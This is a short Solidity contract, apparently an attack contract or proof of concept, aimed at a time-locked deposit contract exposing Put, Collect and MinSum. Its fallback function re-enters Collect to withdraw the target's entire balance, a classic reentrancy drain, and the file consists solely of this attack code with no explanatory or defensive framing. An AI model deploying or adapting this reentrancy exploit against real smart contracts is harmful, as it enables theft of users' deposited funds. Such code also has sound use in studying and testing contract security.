contract ReentrantAttacker {
    C public target;
    uint256 public unlockTime;

    function setTarget(address _target, uint256 _unlockTime) external {
        target = C(_target);
        unlockTime = _unlockTime;
    }

    function attack() external payable {
        target.Put{value: msg.value}(unlockTime);
    }

    fallback() external payable {
        // Reenter: collect the entire balance (the Put has already added msg.value)
        if (address(target).balance >= target.MinSum()) {
            target.Collect(address(target).balance);
        }
    }
}

